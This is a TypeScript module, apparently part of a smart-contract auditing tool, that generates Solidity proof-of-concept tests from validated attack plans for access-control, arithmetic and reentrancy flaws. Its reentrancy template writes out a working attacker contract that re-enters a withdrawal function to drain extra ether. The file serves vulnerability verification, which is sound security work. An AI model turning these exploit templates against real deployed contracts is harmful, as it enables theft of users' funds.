import path from "node:path";
import { promises as fs } from "node:fs";
import type { GeneratedTest, ValidatedAttackPlan } from "./types.js";

function sanitizeIdentifier(value: string): string {
  return value.replace(/[^A-Za-z0-9_]/g, "_");
}

function solidityLiteral(type: string | undefined, value: string | number | boolean): string {
  if (!type) {
    return String(value);
  }
  if (type === "address") {
    return typeof value === "string" ? value : `address(${String(value)})`;
  }
  if (type === "bool") {
    return String(value);
  }
  if (type.startsWith("uint") || type.startsWith("int")) {
    return String(value);
  }
  return String(value);
}

function buildFunctionCallArguments(plan: ValidatedAttackPlan): string {
  const signatureArgTypes = plan.normalizedSampleArguments.map((_, index) => {
    if (plan.targetStateVariableKeyType && index === 0 && plan.attackType === "access-control" && plan.targetStateVariableType?.startsWith("mapping")) {
      return plan.targetStateVariableKeyType;
    }
    return undefined;
  });

  return plan.normalizedSampleArguments
    .map((value, index) => solidityLiteral(signatureArgTypes[index], value))
    .join(", ");
}

function buildObservedValueExpression(plan: ValidatedAttackPlan): string | null {
  if (!plan.targetStateVariable) {
    return null;
  }
  if (plan.targetStateVariableType?.startsWith("mapping")) {
    const key = plan.normalizedSampleArguments[0];
    return `target.${plan.targetStateVariable}(${solidityLiteral(plan.targetStateVariableKeyType, key)})`;
  }
  return `target.${plan.targetStateVariable}()`;
}

function buildAccessControlTest(plan: ValidatedAttackPlan): string {
  const observedExpr = buildObservedValueExpression(plan);
  const functionName = plan.resolvedFunctions[0];
  const args = buildFunctionCallArguments(plan);

  if (!observedExpr) {
    throw new Error(`Could not materialize access-control proof scaffold for ${plan.contractName} without an observable state variable`);
  }

  return `    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}();
        uint256 beforeValue = uint256(${observedExpr});
        target.${functionName}(${args});
        uint256 afterValue = uint256(${observedExpr});
        require(afterValue != beforeValue, "unauthorized call did not mutate observable state");
    }
`;
}

function buildArithmeticTest(plan: ValidatedAttackPlan): string {
  const observedExpr = buildObservedValueExpression(plan);
  const functionName = plan.resolvedFunctions[0];
  const args = buildFunctionCallArguments(plan);

  if (!observedExpr) {
    throw new Error(`Could not materialize arithmetic proof scaffold for ${plan.contractName} without an observable state variable`);
  }

  return `    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}();
        uint256 beforeValue = uint256(${observedExpr});
        target.${functionName}(${args});
        uint256 afterValue = uint256(${observedExpr});
        require(afterValue != beforeValue, "arithmetic path did not change observable state");
        require(afterValue > beforeValue, "expected arithmetic drift was not observed");
    }
`;
}

function buildReentrancyTest(plan: ValidatedAttackPlan): string {
  const functionName = plan.resolvedFunctions[0];
  return `interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract ${plan.contractName}ReentrancyAttacker {
    ${plan.contractName} internal target;
    uint256 public reentryCount;

    constructor(${plan.contractName} _target) {
        target = _target;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.${functionName}();
    }

    receive() external payable {
        if (reentryCount == 0) {
            reentryCount = 1;
            target.${functionName}();
        }
    }
}

contract ${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}();
        ${plan.contractName}ReentrancyAttacker attacker = new ${plan.contractName}ReentrancyAttacker(target);
        vm.deal(address(this), 1 ether);
        vm.deal(address(target), 2 ether);
        attacker.attack{value: 1 ether}();
        require(attacker.reentryCount() == 1, "reentrant callback was not observed");
        require(address(attacker).balance > 1 ether, "attacker did not extract excess value");
    }
}
`;
}

function buildTestSource(testFilePath: string, plan: ValidatedAttackPlan): string {
  const relativeImport = path.relative(path.dirname(testFilePath), plan.contractPath).replace(/\\/g, "/");
  const contractImport = relativeImport.startsWith(".") ? relativeImport : `./${relativeImport}`;
  const testContractName = `${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test`;
  const firstFunction = plan.resolvedFunctions[0] ?? "target";

  if (plan.attackType === "reentrancy") {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {${plan.contractName}} from "${contractImport}";

${buildReentrancyTest(plan)}`;
  }

  const scaffoldBody = plan.attackType === "access-control" ? buildAccessControlTest(plan) : buildArithmeticTest(plan);

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {${plan.contractName}} from "${contractImport}";

contract ${testContractName} {
${scaffoldBody}
}
`;
}

export async function generateProofScaffolds(projectRoot: string, validatedPlans: ValidatedAttackPlan[]): Promise<GeneratedTest[]> {
  const testDir = path.join(projectRoot, "test", "raze");
  await fs.mkdir(testDir, { recursive: true });

  const tests: GeneratedTest[] = [];
  for (const plan of validatedPlans) {
    const fileName = `${plan.contractName}.${sanitizeIdentifier(plan.attackType)}.t.sol`;
    const testFilePath = path.join(testDir, fileName);
    const source = buildTestSource(testFilePath, plan);
    await fs.writeFile(testFilePath, source, "utf8");
    tests.push({
      findingType: plan.attackType,
      testFilePath,
      source,
      planSource: plan.planSource,
      proofIntent: plan.proofGoal
    });
  }

  return tests;
}
